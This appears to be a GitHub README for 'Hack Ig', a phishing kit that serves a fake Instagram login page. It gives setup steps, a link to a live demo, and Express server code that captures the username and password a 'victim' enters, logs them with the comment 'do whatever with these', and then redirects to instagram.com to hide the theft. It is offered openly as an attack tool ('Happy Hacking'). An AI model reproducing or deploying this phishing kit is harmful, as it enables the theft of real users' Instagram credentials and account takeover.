# Hack Ig

Phish Instagram Account 

This will contain a server file and index file [ instagram login page ]

Wan't a demo ?? 
https://fadhilsaheer.github.io/hack-ig/



## Setup



Install node_modules

You should need node js and npm for running server

```javascript
npm install
```



Host or send html file [ index.html ]

you will get the username and password if victim enter details

```javascript
// code from server
app.get("/login", async(req, res) => {
  let username = await req.query.username;
  let password = await req.query.password;

  console.log(`${username} : ${password}`); // show username and password in console

  // do whatever with these
  
  res.redirect("http://instagram.com");//redirect as your wish
});
```



Happy Hacking 🐱‍💻
